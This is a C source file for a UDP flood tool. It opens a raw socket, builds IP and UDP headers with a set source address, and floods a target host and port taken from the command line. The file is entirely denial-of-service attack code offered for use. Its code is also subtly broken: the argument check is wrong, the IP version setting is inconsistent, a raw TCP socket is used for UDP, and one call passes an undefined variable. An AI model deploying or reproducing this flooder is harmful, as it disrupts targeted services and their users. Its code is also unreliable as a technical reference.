#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"

int main(int argc,char* argv[]){
	srand(time(NULL));
    if(argc==0) fprintf(stdout,"Usage: udp-flood --dest www.host.domain --port port");
	else{	
		
		/** Example source address and source port **/
		char* source_address = "127.0.0.1";
		char* source_port    = "1338";
		char* remote_address = argv[2];
		char* remote_port    = argv[4];

		/** Obtain the socket**/
		int sock = get_socket_descriptor_raw_tcp();
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
		
		/** Init sockaddr_in with my network information **/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);

		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		UDP_HEADER *udp_hdr = (UDP_HEADER *)(buffer + sizeof(IP_HEADER));

		/** Fill your headers (IP && UDP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_UDP_PROTOCOL,0,source_address,remote_address,0);

		/** Use auxiliar functions to warn of current status **/
		SHOW_CREATED_IP_HEADER(ip_hdr);
		
		set_udp_header(udp_hdr,"1338","1337",55,0);
		
		SHOW_CREATED_UDP_HEADER(tcp_hdr);

		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Run your application type (UDP flood in this case)**/
		run_flood(sock,100,ip_hdr,&myaddr,buffer);
	
	
	}
	return 0;
}
